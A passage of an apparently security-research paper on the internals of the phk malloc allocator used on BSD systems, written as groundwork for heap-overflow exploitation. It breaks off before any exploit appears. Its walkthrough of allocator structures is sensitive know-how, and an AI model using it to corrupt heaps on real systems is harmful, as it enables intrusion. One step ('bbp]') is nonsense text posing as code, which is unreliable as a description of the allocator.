@@ -1,0 +1,3363 @@
+
+
+                               BSD HEAP SMASHING
+
+
+                                <bbp@krukh.net>
+
+
+
+################################################################################
+
+                                  Introduction
+
+This document explains the internals of Poul-Henning Kamp's malloc()
+implementation (further called "phk malloc") from a security researcher's point
+of view.
+
+                                   ==========
+
+This memory allocator is used by default on the following operating systems:
+
+  * BSDi (I did not have a chance to check this personally)
+  * FreeBSD
+  * NetBSD (this paper is based on source code from the NetBSD tree)
+  * OpenBSD
+
+and it is distributed under the terms of the beer-ware license (and so is
+distributed any code in this paper, unless explicitly otherwise specified :=):
+
+----------------------------------------------------------------------------
+"THE BEER-WARE LICENSE" (Revision 42):
+<phk@FreeBSD.ORG> wrote this file.  As long as you retain this notice you
+can do whatever you want with this stuff. If we meet some day, and you think
+this stuff is worth it, you can buy me a beer in return.   Poul-Henning Kamp
+----------------------------------------------------------------------------
+
+                                   ==========
+
+The first section of this document gives a taste of what this allocator is
+made of. The constants and data structures used to reference several kinds of
+resources (namely: memory pages, large chunks, tiny chunks, and medium-sized
+chunks) are then presented. The data structures used internally by the allocator
+are then explained. From this point, the stage is set for the exposing of the
+gory details of the malloc(), free(), and realloc() functions. Afterwards,
+sample heap corruption exploitation techniques and a few tips and tricks I
+thought of when writing this paper and exploiting vulnerabilities on BSD systems
+are provided. At last, a vulnerability in a widely used program is discussed and
+exploited, as such a paper wouldn't be complete without a real life example.
+
+
+
+################################################################################
+
+                             Preamble and overview
+
+Something that is worth reminding of is that malloc() is not able to physically
+obtain a memory area from the CPU. It only requests the operating system's
+kernel to do so. Two mechanisms are available for this purpose:
+
+  * The first way to request memory from the kernel is through the sbrk() and
+    brk() calls. These functions modify the position of the break (ie. the
+    lowest invalid address after the end of the uninitialized data region, aka
+    BSS of the program, and all memory between the end of the BSS and the break
+    is valid memory that may be made part of the heap). brk() sets the break to
+    its argument, and sbrk() increases it by its argument and returns a pointer
+    to the start of the newly obtained area.
+
+  * The second way is to mmap() a dummy file descriptor (-1, or an open file
+    descriptor to /dev/zero). This job is performed by the MMAP macro:
+
+      #define MMAP(size) \
+              mmap(0, (size), PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, \
+                  MMAP_FD, (off_t)0);
+
+    This macro requests a region of size contiguous bytes to be mapped by
+    the kernel and evaluates to a pointer to this region on success and to
+    MAP_FAILED on failure.
+
+<spam subject="PRIVATE AND CONFIDENTIAL" from="first son of the mother and of
+the third wife of the recently assassinated president of [please insert some
+random country name you don't know anything of here]">
+
+See [3] for typical values of the break and typical return values of mmap() on
+various operating systems and architectures.
+
+</spam>
+
+                                   ==========
+
+Operation of phk malloc relies on two memory management layers. The first,
+lowest layer, only knows about memory pages (4096 bytes blocks aligned on 4096
+bytes boundaries on i86 CPUs). The second layer handles memory chunks. Three
+categories of chunks should be distinguished here: tiny chunks, medium-sized
+chunks, and large chunks. Contrary to large chunks that always reside in
+dedicated pages, medium-sized and tiny chunks are grouped into pages that
+contain several of them. However, all chunks stored in a given page have the
+same size.
+
+                                   ==========
+
+At last, the rest of this document sometimes refers to the configuration
+of phk malloc. In fact, the behaviour of this malloc implementation is
+partly configurable, depending on the /etc/malloc.conf symbolic link and the
+MALLOC_OPTIONS environment variable. See [2] for further detail.
+
+
+
+################################################################################
+
+                          Initialization of phk malloc
+
+When a function in the public interface of phk malloc is called for the first
+time by an application program, the malloc_init() function is called to
+initialize some static variables. Their values when malloc_init() returns are
+provided here.
+
+                                   ==========
+
+static size_t malloc_pagesize contains the size in bytes of a memory page.
+
+                                   ==========
+
+static size_t malloc_pageshift is initialized so that malloc_pagesize equals
+1<<malloc_pageshift.
+
+                                   ==========
+
+static size_t malloc_pagemask is initialized to malloc_pagesize-1. Provided
+malloc_pagesize is necessarily a power of 2, for any address addr, 
+( addr % malloc_pagesize ) equals ( addr & malloc_pagemask ).
+
+                                   ==========
+
+static size_t malloc_origo is initialized to the beginning of the brk() heap
+region, rounded up to a multiple of malloc_pagesize, and then divided by
+malloc_pagesize. So far, if an array was to reference each page in the brk()
+heap region, the index associated with a page could be given by the following
+formula:
+
+  idx = ( page_address / malloc_pagesize ) - malloc_origo
+
+Such an array does exist in phk malloc, however, it is split into two parts. The
+first part has malloc_pageshift entries and serves a different purpose that is
+detailed later in this document, and the second part simply references all pages
+in the brk() heap region. Thus, malloc_pageshift is substracted from
+malloc_origo.
+
+At last, the value of malloc_origo is yielded from:
+
+  malloc_origo = ( rounded_up_brk_start / malloc_pagesize ) - malloc_pageshift
+
+where rounded_up_brk_start is the start of the brk() region of the heap, rounded
+up to a multiple of malloc_pagesize. Then, the index of an entry in the array,
+relative to the beginning of its first part, is given by the aforementioned
+formula. In practice, this calculation is performed by the ptr2idx macro,
+defined as:
+
+#define ptr2idx(foo) (((size_t)(foo) >> malloc_pageshift)-malloc_origo)
+
+                                   ==========
+
+static unsigned malloc_cache is initialized to 16 * malloc_pagesize (this may
+vary depending on the configuration, but will remain a power of 2 multiplied
+by malloc_pagesize). It is the number of unused pages that may be kept by phk
+malloc at the top of the heap before it starts giving memory back to the kernel
+and decreasing the break.
+
+                                   ==========
+
+static struct pgfree *px is at last initialized with the first call to the
+internal memory allocator of phk malloc:
+
+  px = (struct pgfree *) imalloc (sizeof *px);
+
+Don't bother with this variable for now, its role will be explained in the next
+sections. It is presented here only to stress that the parameter of the first
+call to phk malloc's internal memory allocation function, imalloc(), is always
+sizeof ( struct pgfree ).
+
+                                   ==========
+
+static unsigned malloc_started is set to 1 at the end of malloc_init to remember
+initialization is completed.
+
+
+
+################################################################################
+
+                                 Pages handling
+
+As stated in the Preamble and overview section of this document, the lowest
+layer of phk malloc only knows about memory pages. All pages in the brk() heap
+region are referenced in an array called the pages directory, declared as
+follows:
+
+static struct   pginfo **page_dir;
+
+This array is split into two parts: its first malloc_pageshift elements serve a
+special purpose that will be explained later. The following elements are
+pointers whose values depend on the role of the associated memory page. As
+explained above, the pointer to a struct pginfo associated with a given memory
+page is:
+
+  page_dir[ ( page_address / malloc_pagesize ) - malloc_origo ]
+
+The total number of elements of this array (including the two parts) is always
+kept in the malloc_ninfo static variable, declared as follows:
+
+static unsigned malloc_ninfo;
+
+During the initialization of phk malloc, one memory page is allocated with the
+MMAP() macro for the pages directory:
+
+page_dir = (struct pginfo **) MMAP(malloc_pagesize);
+
+Don't care about the exact definition of a struct pginfo for now, it is detailed
+later in this document.
+
+                                   ==========
+
+The pointers in page_dir may take one of the following values:
+
+#define MALLOC_NOT_MINE ((struct pginfo*) 0)
+#define MALLOC_FREE     ((struct pginfo*) 1)
+#define MALLOC_FIRST    ((struct pginfo*) 2)
+#define MALLOC_FOLLOW   ((struct pginfo*) 3)
+#define MALLOC_MAGIC    ((struct pginfo*) 4)
+
+A value of MALLOC_NOT_MINE (the default value) indicates that the associated
+memory page has not been requested from the kernel with brk(), and shouldn't be
+used.
+
+A value of MALLOC_FIRST indicates that the associated memory page is the first
+of a series of memory pages that belong to the same chunk. The other pointers
+associated with this memory area are set to MALLOC_FOLLOW. These values are used
+to handle large chunks.
+
+A value of MALLOC_FREE is associated with pages that have been requested and
+obtained from the kernel, but are currently unused, due to calls to realloc() or
+free(). They may be used later to satisfy further malloc() or realloc() memory
+allocation requests.
+
+The MALLOC_MAGIC value is never attributed to one of these pointers, and it is
+only used for comparisons, in order to determine whether one of them is set to
+one of the aforementioned values, or if it has a larger value, which implies it
+is used to handle medium-sized chunks or tiny chunks.
+
+                                   ==========
+
+Available free sets of contiguous memory pages (ie. memory pages whose
+associated pointer in the pages directory is MALLOC_FREE) are referenced in a
+doubly linked list of struct pgfree elements.
+
+The pgfree structure has the following fields:
+
+struct pgfree {
+    struct pgfree       *next;  /* next run of free pages */
+    struct pgfree       *prev;  /* prev run of free pages */
+    void                *page;  /* pointer to free pages */
+    void                *end;   /* pointer to end of free pages */
+    size_t              size;   /* number of bytes free */
+};
+
+As one may have guessed, the next and prev fields are pointers to the next and
+previous elements in the list. The next field is set to 0 for the last element
+of the list, and the prev field of the first element of the list is set to
+&free_list. The free_list static variable is declared as follows:
+
+static struct pgfree free_list;
+
+and it is unused, except for its next field, that points to the first struct
+pgfree element of the list, or is set to 0 if the list is empty. Although this
+next field is not explicitly initialized by malloc_init, it is still initially
+set to 0.
+
+The page field is a pointer to the beginning of the first memory page of the
+set, and the end field is a pointer to the lowest address that is located after
+the set. The size field is the size in bytes of the memory area.
+
+For instance, if three adjacent 4096 bytes pages starting at 0x42424000 are
+available, the corresponding struct pgfree element has the following fields:
+
+  page = 0x42424000
+  end = 0x42427000 = page + 3 * 4096
+  size = 0x3000 = 3 * 4096
+
+A few things may be noticed:
+
+  * Elements of the free pages list are always obtained through calls to the
+    internal memory allocator, imalloc(), and may for instance be located
+    between two user chunks (ie. chunks allocated and used by the application).
+
+  * The list of free pages is sorted: the closer to the end of the list, the
+    higher the page field. No contiguous sets of pages should be referenced in
+    the free pages list, such sets are merged (ie. described in a single struct
+    pgfree) whenever possible.
+
+  * If pgf is a pointer to a struct pgfree, then
+    pgf->end == ( pgf->page + pgf->size ) is true, and pgf->page, pgf->end, and
+    pgf->size are multiples of the memory page size in bytes.
+
+                                   ==========
+
+Now, let me present some nasty little hacker nightmare. It is strongly believed
+that security researchers trying to overwrite pgfree structures will learn they
+have to fear the infamous px cache. First, here is a reminder of its definition:
+
+static struct pgfree *px;
+
+This pointer is set, most of the time, to the address of an available
+allocated and ready to use struct pgfree. For instance, it is initialized by
+malloc_init(). Most of the time, when a pgfree structure becomes useless and px
+is 0, instead of calling the upper layer functions to free it, the lower layer
+functions set px to the address of the pgfree structure, so that no call to the
+internal memory allocator is required next time a page is freed.
+
+
+
+################################################################################
+
+                                Chunks handling
+
+As explained sooner in this document, chunks are handled differently, depending
+on their size.
+
+                                   ==========
+
+Large chunks are chunks whose size is larger than half a page. When such a
+chunk is allocated, the top level layer simply requests a number of adjacent
+memory pages given by the size of the chunk rounded up to a multiple of
+malloc_pagesize, and then divided by malloc_page_size. The associated elements
+in the pages directory are set to MALLOC_FIRST or MALLOC_FOLLOW by the lower
+layer. The element associated with the first page of the chunk is set to
+MALLOC_FIRST, the following elements are set to MALLOC_FOLLOW.
+
+                                   ==========
+
+Other chunks are tiny and medium-sized chunks. The size of such chunks is always
+a power of 2, and the smallest chunk size is malloc_minsize, that is defined as:
+
+#define malloc_minsize          16U
+
+A given memory page may not contain two chunks that do not have the same size.
+When a tiny or medium-sized chunk is allocated, it is included in an existing
+page containing other chunks that have the same size if such a page is
+available. Otherwise, exactly one memory page is requested from the lower layer,
+and the chunk is included in the newly allocated page.
+
+When a memory page contains tiny or medium-sized chunks, a structure describing
+which chunks are free and which chunks are in use is associated with the page.
+These structures are kept in several linked lists, one list for each possible
+size of chunks. A pointer to the head of each list is stored in the first part
+of the pages directory: page_dir[j] where j is such that ( 1 << j ) is the size
+of the chunks contained in the page.
+
+These structures are declared as follows:
+
+struct pginfo {
+    struct pginfo       *next;  /* next on the free list */
+    void                *page;  /* Pointer to the page */
+    u_short             size;   /* size of this page's chunks */
+    u_short             shift;  /* How far to shift for this size chunks */
+    u_short             free;   /* How many free chunks */
+    u_short             total;  /* How many chunk */
+    u_int               bits[1]; /* Which chunks are free */
+};
+
+The next field is a pointer to the next structure in the list, or 0 if the
+element is the last of the list.
+
+The page field points to the beginning of the page (it is always a multiple of
+malloc_pagesize).
+
+The size field is set to the size in bytes of the chunks contained in this page.
+
+The free field is the number of free chunks in the page.
+
+The total field is the sum of the number of free chunks in the page and of the
+number of allocated chunks in the page. The page is freed (ie. returned to the
+lower layer) whenever ( free == total ) becomes true.
+
+At last, the bits field is a variable size array indicating which chunks in the
+page are free chunks. Each chunk is associated with a unique bit in the field,
+namely the bit obtained when applying the ( 1 << n ) mask to bits[i] where:
+
+  ( i * MALLOC_BITS ) + n = ( chunk_address & malloc_pagemask ) / chunk_size
+
+MALLOC_BITS is the number of bits a u_int has on the specific architecture phk
+malloc is running on. It is defined as follows:
+
+#define MALLOC_BITS     ((int)(8*sizeof(u_int)))
+
+This bit is set to one when the chunk is free, and to 0 when the chunk is in
+use. Of course, the effective size of the bits field will depend on the number
+of chunks in the page.
+
+It's time to look at the place where the pginfo structure itself is stored in.
+In fact, it depends on the size of the chunks. For tiny chunks, the pginfo is
+stored at the beginning of the page, thus reducing the number of available
+chunks for user data in the page (this reduces the total field and the initial
+value of the free field, and the corresponding chunks are marqued as used in the
+bits field so that no chunk will overwrite the pginfo structure). The pginfo
+describing a page containing medium-sized chunks is allocated through the
+internal memory allocator, imalloc(), and is stored in a tiny chunks page.
+
+Again, a few points are worth mentioning here:
+
+  * The pginfo structures lists are sorted, in increasing page field order.
+
+  * Provided that the minimum chunk size is malloc_minsize (16), the 4 first
+    elements of the pages directory are left unused.
+
+  * The upper layer functions handling tiny and medium-sized chunks pages set
+    the corresponding entry of the pages directory to the address of the pginfo
+    structure describing the page, thus overwriting the MALLOC_FIRST that the
+    lower layer functions write there when they are called to allocate the page.
+
+                                   ==========
+
+Last thing to note is the way the distinction between tiny and medium-sized
+chunks is made: if the total size of the pginfo needed to describe the page is
+less than half a chunk, then these chunks are medium-sized chunks, otherwise,
+these chunks are tiny chunks. The size of the pginfo here is to be considered
+including the effective size of the bits field.
+
+
+
+################################################################################
+
+                    General purpose functions and variables
+
+Time for the gory details of the real stuff. Time to do a step by step run of
+the allocator functions. From now on, when I say the allocator warns about
+something, it means it calls the wrtwarning() function, that writes an error
+message on STDERR_FILENO, and possibly abort()s, depending on the configuration
+(it does not abort() by default). And when I say that the allocator reports an
+error, it means it writes an error message on STDERR_FILENO, sets the suicide
+static variable to 1 (otherwise, it is always 0) and abort()s.
+
+                                   ==========
+
+There is also a recursion prevention mechanism that is used by most malloc()
+public functions. The malloc_active variable is declared as follows:
+
+static int malloc_active;
+
+Although not explicitly initialized in malloc_init(), its initial value is 0.
+Whenever a public function is called, it checks malloc_active is 0 and
+increments it at the same time. If malloc_active was not zero, the function
+warns about a recursive call, decrements malloc_active, and returns immediately.
+Otherwise, the function performs normal operation and decreases malloc_active
+just before it returns. This should help prevent most security flaws coming
+from poorly written signal handlers.
+
+
+
+################################################################################
+
+                          Memory allocation algorithms
+
+                                   ==========
+
+malloc_pages(size_t size) algorithm
+
+malloc_pages is the lower layer allocation function. Its only argument is the
+number of bytes that need to be allocated, and it returns a pointer to the
+beginning of the allocated set of contiguous pages, or 0 if a problem prevents
+it from allocating the requested memory.
+
+aa] It first rounds the size argument up to a multiple of malloc_pagesize:
+
+       size = pageround(size);
+
+    with pageround defined as:
+
+       #define pageround(foo) (((foo) + (malloc_pagemask))&(~(malloc_pagemask)))
+
+ab] Then, it looks for a sufficient number of free adjacent memory pages in the
+    doubly linked list of free pages:
+
+       for(pf = free_list.next; pf; pf = pf->next) {
+           if (pf->size < size)
+               continue;
+
+ac] If the rest of this loop's code is executed, then a free memory area whose
+    length is at least the requested length, has been found. If the length of
+    the free memory area is exactly (remember all sizes are rounded up to a
+    multiple of malloc_pagesize) the requested amount of memory, then the pgfree
+    element is removed from the list, and the loop is interrupted:
+
+            if(pf->size == size) {
+                p = pf->page;
+                    if (pf->next)
+                pf->next->prev = pf->prev;
+                pf->prev->next = pf->next;
+                delay_free=pf;
+                break;
+            }
+
+ad] Otherwise, the free memory area has more pages than necessary, and only the
+    required number of pages is taken from the area, before the loop is
+    interrupted:
+
+             p = pf->page;
+             pf->page = (char *)pf->page + size;
+             pf->size -= size;
+             break;
+         }
+
+ae] At the end of the loop, size is divided by the size of a page and thus from
+    now on represents a number of pages instead of a number of bytes. And p is 0
+    if and only if no large enough free memory area has been found in free_list.
+    In that case, new pages are requested from the kernel through a call
+    to map_pages:
+
+        if (!p)
+            p = map_pages(size);
+
+    aea] The map_pages(size_t pages) function requests a number of bytes from
+         the kernel through a call to sbrk(), and returns a pointer to the
+         beginning of the allocated region. Note that the new break position is
+         calculated from its current position obtained through a call to
+         sbrk(0), hopefully enabling phk malloc to operate concurrently with
+         another memory allocator (in the following code, caddr_t is a char *):
+
+             result = (caddr_t)pageround((size_t)sbrk(0));
+             tail = result + (pages << malloc_pageshift);
+             if (brk(tail)) {
+                 return 0;
+             }
+             last_idx = ptr2idx(tail) - 1;
+             malloc_brk = tail;
+
+         Note the function also sets the last_idx global variable to the index
+         in the pages directory of the last allocated page in the brk() region.
+
+    aeb] Then, map_pages() checks that the pages directory is large enough to
+         handle the new bunch of allocated pages (note that an extra bucket, set
+         to some value different from MALLOC_FOLLOW is required), otherwise,
+         extend_pgdir() is called to fix this:
+
+             if ((last_idx+1) >= malloc_ninfo && !extend_pgdir(last_idx))
+                 return 0;
+
+         aeba] The extend_pgdir(size_t idx) function allocates enough memory
+               pages in the mmap() region for the whole pages directory and
+               moves it to the newly allocated area, then munmap()s the former
+               pages directory. It returns 0 if something went wrong:
+
+                   newlen = pageround(idx * sizeof *page_dir) + malloc_pagesize;
+                   oldlen = malloc_ninfo * sizeof *page_dir;
+                   new = (struct pginfo**) MMAP(newlen);
+                   if (new == (struct pginfo **)-1)
+                       return 0;
+                   memcpy(new, page_dir, oldlen);
+                   malloc_ninfo = newlen / sizeof *page_dir;
+                   [...]
+                   return 1;
+                
+
+    aec] At last, a pointer to the newly allocated set of pages is returned:
+
+             return result;
+
+af] Now, if p is non zero (which is necessarily the case except when running out
+    of memory), the entry of the pages directory associated with p is set to
+    MALLOC_FIRST, and the ( size - 1 ) following entries (remember size is now a
+    number of pages) are set to MALLOC_FOLLOW:
+
+        if (p) {
+            idx = ptr2idx(p);
+            page_dir[idx] = MALLOC_FIRST;
+            for (i=1;i<size;i++)
+                page_dir[idx+i] = MALLOC_FOLLOW;
+
+ag] Depending on the configuration, the freshly allocated bytes may be set to
+    SOME_JUNK (not by default):
+
+            if (malloc_junk)
+                memset(p, SOME_JUNK, size << malloc_pageshift);
+        }
+
+    with SOME_JUNK defined as:
+
+        #define SOME_JUNK      0xd0             /* as in "Duh" :-) */
+
+ah] At last, if a set of free pages has been completely used for the allocation,
+    then delay_free is non 0 and it is a pointer to the now useless pgfree
+    structure describing this set. If the px cache is empty, it is filled with
+    this structure, otherwise, the structure is deallocated (we will see later
+    it has been allocated using the upper layer memory allocator):
+
+        if (delay_free) {
+            if (!px)
+                px = delay_free;
+            else
+                ifree(delay_free);
+        }
+
+ai] The pointer to the allocated pages can now be returned to the caller:
+
+        return p;
+
+                                   ==========
+
+imalloc(size_t size) algorithm
+
+imalloc() is the internal upper layer memory allocator of phk malloc. This means
+that any chunk allocation, regardless of its purpose (internal use to store a
+pgfree structure or chunk for user data), is made through a call to imalloc().
+
+ba] First, imalloc() performs a few sanity checks: if suicide is non zero, then
+    abort() is called. If ( size + malloc_pagesize ) causes an integer overflow,
+    then 0 is returned.
+
+bb] If the requested size is smaller than or equal to malloc_maxsize (ie.
+    malloc_pagesize/2), then the chunk is a tiny or medium-sized one and is
+    allocated via a call to the malloc_bytes() function.
+
+    bba] The malloc_bytes(size_t size) function first checks the requested size
+         is at least malloc_minsize, otherwise, it sets it to malloc_minsize,
+         ie. 16 bytes.
+
+    bbb] The j local integer is set to a value such that ( 1 << j ) equals size
+         rounded up to a power of 2:
+
+             j = 1;
+             i = size-1;
+             while (i >>= 1)
+                 j++;
+
+    bbc] If no page containing chunks of ( 1 << j ) bytes is available, a new
+         one is allocated thanks to the malloc_make_chunks() function:
+
+             if (!page_dir[j] && !malloc_make_chunks(j))
+                 return 0;
+
+         Provided that the page_dir[j] list of pginfo structures is sorted in
+         increasing order of page field value, the page that will be used is the
+         lowest address non full page of ( 1 << j ) bytes chunks available.
+
+         bbca] The malloc_make_chunks(int bits) function allocates a new page
+               and creates its pginfo structure, it returns 0 if a problem
+               occurs. First, a new page is allocated thanks to the lower level
+               malloc_pages function:
+
+                   pp = malloc_pages(malloc_pagesize);
+                   if (!pp)
+                       return 0;
+        
+         bbcb] Then the length of the necessary pginfo structure (including the
+               variable length bits field) is computed, multiplied by two, and
+               the result is compared to the chunk size, to determine whether
+               the chunks are tiny or medium-sized. In the last case, a new
+               pginfo structure is allocated with a recursive (sigh) call to
+               imalloc():
+
+                   l = (int)offsetof(struct pginfo, bits[0]);
+                   l += sizeof bp->bits[0] *
+                      (((malloc_pagesize >> bits)+MALLOC_BITS-1) / MALLOC_BITS);
+                   if ((1<<(bits)) <= l+l) {
+                       bp = (struct  pginfo *)pp;
+                   } else {
+                       bp = (struct  pginfo *)imalloc((size_t)l);
+                       if (!bp) {
+                           ifree(pp);
+                           return 0;
+                       }
+                   }
+
+         bbcc] All fields of the pginfo structure are then properly initialized,
+               in particular, malloc_pagesize / ( ( 1 << bits ) * MALLOC_BITS )
+               words in the bits field are set to ~0:
+
+                   bp->size = (1<<bits);
+                   bp->shift = bits;
+                   bp->total = bp->free = malloc_pagesize >> bits;
+                   bp->page = pp;
+                   k = bp->total;
+                   i = 0;
+                   for(;k-i >= MALLOC_BITS; i += MALLOC_BITS)
+                       bp->bits[i / MALLOC_BITS] = ~0U;
+                   for(; i < k; i++)
+                       bp->bits[i/MALLOC_BITS] |= 1<<(i%MALLOC_BITS);
+
+               The last for loop handles the case of a hardware architecture
+               where the page size would not be an integer multiple of
+               ( 1 << bits ) * MALLOC_BITS.
+
+         bbcd] When the page is allocated to handle tiny chunks, the beginning
+               of the page is marked as allocated, so that the pginfo structure
+               living there won't be overwritten by user data:
+
+                   if (bp == bp->page) {
+                       for(i=0;l > 0;i++) {
+                           bp->bits[i/MALLOC_BITS] &= ~(1<<(i%MALLOC_BITS));
+                           bp->free--;
+                           bp->total--;
+                           l -= (1 << bits);
+                       }
+                   }
+
+         bbce] The page is then properly referenced in the pages directory,
+               and the pginfo structure is inserted in the appropriate list:
+
+                   page_dir[ptr2idx(pp)] = bp;
+                   bp->next = page_dir[bits];
+                   page_dir[bits] = bp;
+
+    bbd] malloc_bytes then looks for the first word in the bits field of the
+         pginfo structure describing the page that has an available free chunk,
+         and then for the least significant bit of that word that is set to 1,
+         in other words, it looks for the lowest address available free chunk:
+
+             bp = page_dir[j];
+             for (lp = bp->bits; !*lp; lp++)
+                 ;
+             u = 1;
+             k = 0;
+             while (!(*lp & u)) {
+               u += u;
+               k++;
+             }
+
+    bbe] It then sets the bit to 0, indicating the chunk is from now on in use:
+
+            *lp ^= u;
+
+    bbf] The number of free chunks in the page is decreased, and the page is
+         removed from the list of non full pages if it has no more free chunks:
+
+             if (!--bp->free) {
+                 page_dir[j] = bp->next;
+                 bp->next = 0;
+             }
+
+    bbg] The offset of the chunk in the page is computed, and, depending on the
+         configuration, each byte in the chunk may be set to SOME_JUNK, then,
+         the chunk address is returned to the caller:
+
+             k += (lp-bp->bits)*MALLOC_BITS;
+             k <<= bp->shift;
+             if (malloc_junk)
+                 memset((u_char*)bp->page + k, SOME_JUNK, (size_t)bp->size);
+             return (u_char *)bp->page + k;
+
+    bbp] uværet søke særlig tilbake og hue og øfrâr ette kan bakkenivået
+         utgjøre oppført jåfører fjellplatået ette per gøten:
+
+             iiigrumpf grouiihonk hooonk;
+             oink hiiii uiihonk uiigrumpf;
+             iiihiiii snort grumpf snort;
+
+         hewhaheubeuaaaaaaeuhhragrahegra!
+
+bc] Otherwise, the chunk is a large chunk and is directly allocated with the
+    malloc_pages() function, that has already been discussed in this document.
+
+bd] Depending on the configuration (not by default), if no memory could be
+    allocated, malloc() may report the error.
+
+be] Again, depending on the configuration, size nul bytes may be written in the
+    returned memory.
+
+                                   ==========
+
+malloc(size_t size) algorithm
+
+Now, malloc() only needs to perform a few checks and call imalloc() to do the
+real job.
+
+ca] First, malloc() checks there is no concurrent call problem, and otherwise
+    issues a warning and returns 0:
+
+        if (malloc_active++) {
+            wrtwarning("recursive call.\n");
+            malloc_active--;
+            return (0);
+        }
+
+cb] Then, it checks initialization has properly occured, and otherwise calls
+    malloc_init():
+
+        if (!malloc_started)
+            malloc_init();
+
+cc] If the requested size is 0 and configuration tells malloc() to behave as
+    System V implementations do (this is not the default), it returns 0,
+    otherwise, it calls imalloc() to perform the real job:
+
+        if (malloc_sysv && !size)
+            r = 0;
+        else
+            r = imalloc(size);
+
+cd] At last, malloc_active is reset, and, depending on malloc() configuration,
+    if no memory could be allocated, the error may be reported (not the
+    default):
+
+       malloc_active--;
+       if (r == NULL && (size != 0 || !malloc_sysv)) {
+           if (malloc_xmalloc)
+               wrterror("out of memory.\n");
+           errno = ENOMEM;
+       }
+
+
+
+################################################################################
+
+                          Memory deallocation algorithms
+
+                                   ==========
+
+free_pages(void *ptr, size_t idx, struct pginfo *info) algorithm
+
+free_pages() is the lower layer deallocation function. Its purpose is to collect
+free memory pages, and possibly give them back to the kernel. Its argument are
+respectively a pointer to the free page, the index of this page in the pages
+directory, and either a pointer to the pginfo structure describing the page if
+it contains some medium-sized or tiny chunks or MALLOC_FIRST otherwise. In both
+cases, info is nothing else than page_dir[idx].
+
+da] The function first checks that the page is not already free, that its entry
+    in the pages directory is effectively set to MALLOC_FIRST (which should
+    always be the case for the first page of a contiguous set of malloced
+    pages), and that the pointer is a pointer to the start of a page, otherwise,
+    a warning is issued about this problems, and no operation is performed:
+
+        if (info == MALLOC_FREE) {
+            wrtwarning("page is already free.\n");
+            return;
+        }
+        if (info != MALLOC_FIRST) {
+            wrtwarning("pointer to wrong page.\n");
+            return;
+        }
+        if ((size_t)(uintptr_t)ptr & malloc_pagemask) {
+            wrtwarning("modified (page-) pointer.\n");
+            return;
+        }
+
+db] The next step is to count how many pages are to be freed and to mark them as
+    free, setting their pages directory entry to MALLOC_FREE:
+
+        page_dir[idx] = MALLOC_FREE;
+        for (i = 1; page_dir[idx+i] == MALLOC_FOLLOW; i++)
+            page_dir[idx + i] = MALLOC_FREE;
+
+dc] If phk malloc() is told to do so, it will also set the freed memory area to
+    MALLOC_JUNK:
+
+        if (malloc_junk)
+            memset(ptr, SOME_JUNK, l);
+
+dd] The newly freed area can now be inserted in the free pages doubly linked
+    list. In order to do so, the address of the end of the page (in fact, the
+    address of the first byte after the page) needs to be computed. A pgfree
+    structure will also be required in most cases, either taken from the big bad
+    evil px cache, or allocated with a call to the internal memory allocator,
+    imalloc():
+
+        tail = (char *)ptr+l;
+        if (!px)
+            px = imalloc(sizeof *pt);       /* This cannot fail... */
+        px->page = ptr;
+        px->end =  tail;
+        px->size = l;
+
+de] If the free pages list is empty, it is simply created with a reference to
+    the newly freed area:
+
+        if (!free_list.next) {
+            px->next = free_list.next;
+            px->prev = &free_list;
+            free_list.next = px;
+            pf = px;
+            px = 0;
+
+df] Otherwise, a lookup in this list needs to be performed, in order to enforce
+    its sorting policy. Thus, the pf local pointer is set either to the address
+    of the first element of the free pages list that ends after the newly freed
+    memory area or, if no such element exists, to the last element of the list:
+
+        } else {
+            tail = (char *)ptr+l;
+            for(pf = free_list.next; pf->end < ptr && pf->next; pf = pf->next)
+                ;
+
+dg] If the start of the area referenced by pf is higher than the newly freed
+    area's end, the new free area descriptor is simply inserted into the list:
+
+        if (pf->page > tail) {
+            px->next = pf;
+            px->prev = pf->prev;
+            pf->prev = px;
+            px->prev->next = px;
+            pf = px;
+            px = 0;
+
+dh] Otherwise, if the end field of the last examined element of the list is the 
+    address of the newly freed area, then the two areas are contiguous, and the
+    area described by the list's last examined element is extended. The newly
+    described area and the area described by a possible next element (yet left
+    unexamined) in the list may be contiguous, in which case the two areas are
+    merged in the pf structure, and the structure formerly used to describe the
+    highest address area is marked as a structure that will be freed soon (using
+    the pt local variable):
+
+        } else if (pf->end == ptr ) {
+            pf->end = (char *)pf->end + l;
+            pf->size += l;
+            if pf->next && pf->end == pf->next->page ) {
+                pt = pf->next;
+                pf->end = pt->end;
+                pf->size += pt->size;
+                pf->next = pt->next;
+                if (pf->next)
+                    pf->next->prev = pf;
+            }
+
+di] Otherwise, if the newly freed memory area and the area described by the next
+    element of the list (yet unexamined) are contiguous, the next element of the
+    list is extended (its page field is decreased, and its size field is
+    increased):
+
+        } else if (pf->page == tail) {
+            pf->size += l;
+            pf->page = ptr;
+
+dj] Otherwise, either pf is set to the last element of the list, and this
+    element does not describe a memory area that is contiguous to the newly
+    freed area, in which case the new pgfree structure becomes the end of the
+    list, or the list is broken and an error is reported:
+
+        } else if (!pf->next) {
+            px->next = 0;
+            px->prev = pf;
+            pf->next = px;
+            pf = px;
+            px = 0;
+        } else {
+            wrterror("freelist is destroyed.\n");
+        }
+
+dk] Now, if the highest address free pages area has been modified (either
+    because it was merged with another memory area, or because the newly freed
+    area is the highest address one), and if more free pages are available at
+    the end of the brk() region than phk malloc is allowed to keep in its cache,
+    and if no concurrent memory allocator modified the break position, a number
+    of pages is given back to the kernel, so that only the cache maximal size is
+    kept by phk malloc:
+
+        if (!pf->next &&
+          pf->size > malloc_cache &&
+          pf->end == malloc_brk &&
+          malloc_brk == sbrk((intptr_t)0)) {
+          pf->end = (char *)pf->page + malloc_cache;
+          pf->size = malloc_cache;
+          brk(pf->end);
+          malloc_brk = pf->end;
+          idx = ptr2idx(pf->end);
+          last_idx = idx - 1;
+          for(i=idx;i <= last_idx;)
+              page_dir[i++] = MALLOC_NOT_MINE;
+        }
+
+    The global variable last_idx is also modified to reflect this new memory
+    layout.
+
+dl] At last, if a pgfree structure is to be freed, then it is done by the higher
+    level function ifree():
+
+        if (pt)
+            ifree(pt);
+
+                                   ==========
+
+ifree(void *ptr) algorithm
+
+ifree() is the internal upper layer memory deallocator of phk malloc. This means
+that any chunk deallocation, regardless of its former purpose (internal use to
+store a pgfree structure or chunk for user data), is made through a call to
+ifree().
+
+ea] First, ifree() checks if it has been called with a NULL pointer as an
+    argument in which case it performs no operation, and if phk malloc has been
+    properly initialized, and otherwise issues a warning and performs no
+    operation, it also immediately returns if suicide is non 0:
+
+        if (!ptr)
+            return;
+        if (!malloc_started) {
